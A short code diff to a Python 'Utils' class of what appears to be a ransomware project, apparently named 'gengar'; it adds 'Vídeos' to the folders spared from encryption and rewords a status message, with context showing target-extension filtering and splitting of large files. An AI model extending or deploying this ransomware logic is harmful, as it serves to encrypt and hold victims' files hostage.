@@ -44,7 +44,8 @@ class Utils:
                       'Windows',
                       'ransomware',
                       'Boot',
-                      'System Volume Information']
+                      'System Volume Information',
+                      'Vídeos']
 
 
     # file extensions that must avoid from encrypting
@@ -114,7 +115,7 @@ class Utils:
                         ext = self.get_file_extension(full_path)
                         if ext in self.TARGET_EXT and ext not in self.EXCLUDED_EXT:
                             if os.path.getsize(full_path) > self.MAX_SIZE_FILE:
-                                print("splitting...")
+                                print("splitting files...")
                                 dir_name = str(fn) + "_gengar_splitted_file"
                                 os.mkdir(dir_name)
                                 fs.split(file=full_path, split_size=self.MAX_SIZE_FILE, output_dir=dir_name)
